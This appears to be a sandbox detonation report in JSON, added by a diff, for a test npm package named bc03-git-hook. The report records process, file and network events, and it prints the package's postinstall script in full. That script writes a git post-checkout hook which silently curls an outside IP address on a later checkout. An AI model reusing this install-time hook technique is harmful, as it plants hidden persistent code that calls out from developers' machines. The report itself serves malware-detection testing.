@@ -1,0 +1,91 @@
+{
+ "job_id": "a90a74cb-f751-42f0-a180-4e61bf1306ba",
+ "status": "completed",
+ "exit_code": 0,
+ "duration_s": 2.95,
+ "exec_events": [
+  {
+   "ts": "2026-11-03T22:30:23.760698732Z",
+   "pid": 286289,
+   "ppid": 286262,
+   "binary": "/usr/local/bin/docker-entrypoint.sh",
+   "args": "/usr/local/bin/docker-entrypoint.sh /bin/sh -c \"/bin/true pre-8de25c0df661a177; \"$@\"; rc=$?; /bin/true post-8de25c0df661a177; exit $rc\" detonator-witness npm install --no-audit --no-fund --prefix payloads/bc03-git-hook",
+   "parent_binary": "/usr/bin/containerd-shim-runc-v2",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-03T22:30:23.764626524Z",
+   "pid": 286328,
+   "ppid": 286289,
+   "binary": "/usr/local/bin/npm",
+   "args": "node /usr/local/bin/npm install --no-audit --no-fund --prefix payloads/bc03-git-hook",
+   "parent_binary": "/bin/sh",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-03T22:30:23.765767959Z",
+   "pid": 286328,
+   "ppid": 286328,
+   "binary": "/usr/local/bin/node",
+   "args": "/usr/local/bin/npm install --no-audit --no-fund --prefix payloads/bc03-git-hook",
+   "parent_binary": "/usr/local/bin/npm",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-03T22:30:24.225547298Z",
+   "pid": 286347,
+   "ppid": 286328,
+   "binary": "/usr/bin/sh",
+   "args": "-c \"node scripts/setup.js\"",
+   "parent_binary": "/usr/local/bin/node",
+   "uid": 10001,
+   "cwd": "/work/payloads/bc03-git-hook"
+  },
+  {
+   "ts": "2026-11-03T22:30:24.226698916Z",
+   "pid": 286348,
+   "ppid": 286347,
+   "binary": "/usr/local/bin/node",
+   "args": "scripts/setup.js",
+   "parent_binary": "/usr/bin/sh",
+   "uid": 10001,
+   "cwd": "/work/payloads/bc03-git-hook"
+  }
+ ],
+ "connect_events": [],
+ "dns_queries": [],
+ "file_events": [
+  {
+   "ts": "2026-11-03T22:30:23.877748941Z",
+   "pid": 286328,
+   "binary": "/usr/local/bin/node",
+   "path": "/home/runner/.npmrc"
+  }
+ ],
+ "executed_scripts": [
+  {
+   "path": "/work/payloads/bc03-git-hook/scripts/setup.js",
+   "package": null,
+   "sha256": "05fed3b49c959f29ab5e4deeadbc364d99d42a8a0bd0c368d6db2334efb777f3",
+   "content": "const fs = require(\"fs\"), path = require(\"path\");\n// Install-time write of a hook that fires later, on the next `git checkout`, not now.\nconst hook = path.resolve(process.cwd(), \"..\", \"..\", \"..\", \".git\", \"hooks\", \"post-checkout\");\nconst body = \"#!/bin/sh\\ncurl -s -m 3 http://198.51.100.20/b >/dev/null 2>&1 &\\n\";\ntry { fs.writeFileSync(hook, body, { mode: 0o755 }); } catch {}\n",
+   "truncated": false
+  }
+ ],
+ "decoys": {},
+ "stdout_tail": "\n> bc03@1.0.0 postinstall\n> node scripts/setup.js\n\n\nup to date in 406ms\n",
+ "stderr_tail": "",
+ "truncated": false,
+ "error": null,
+ "sensor": {
+  "pre_seen": true,
+  "post_seen": true
+ },
+ "resources": {
+  "cpu_s": 0.06,
+  "peak_memory_mb": 4.8,
+  "samples": 1
+ }
+}
